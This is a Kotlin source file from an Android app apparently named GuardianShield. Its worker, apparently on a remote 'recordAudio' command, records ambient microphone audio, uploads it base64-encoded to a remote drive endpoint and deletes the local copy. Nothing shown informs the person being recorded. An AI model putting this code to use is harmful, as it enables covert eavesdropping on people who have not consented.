package com.guardianshield.app.workers

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Base64
import com.guardianshield.app.utils.DriveApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileInputStream

object AudioRecordWorker {

    fun recordAmbientAudio(context: Context, durationSeconds: Int = 15) {
        CoroutineScope(Dispatchers.IO).launch {
            var recorder: MediaRecorder? = null
            var outputFile: File? = null
            try {
                outputFile = File(context.cacheDir, "ambient_record.m4a")
                if (outputFile.exists()) outputFile.delete()

                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }

                recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                recorder.setAudioEncodingBitRate(64000)
                recorder.setAudioSamplingRate(44100)
                recorder.setOutputFile(outputFile.absolutePath)

                recorder.prepare()
                recorder.start()

                // Record for duration
                delay(durationSeconds * 1000L)

                recorder.stop()
                recorder.release()
                recorder = null

                // Read file to base64
                if (outputFile.exists() && outputFile.length() > 0) {
                    val bytes = ByteArray(outputFile.length().toInt())
                    val fis = FileInputStream(outputFile)
                    fis.read(bytes)
                    fis.close()

                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

                    DriveApiClient.postToDrive("upload_audio", mapOf(
                        "base64" to base64,
                        "durationSeconds" to durationSeconds
                    ))
                    DriveApiClient.acknowledgeCommand("recordAudio")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                recorder?.release()
                outputFile?.delete()
            }
        }
    }
}
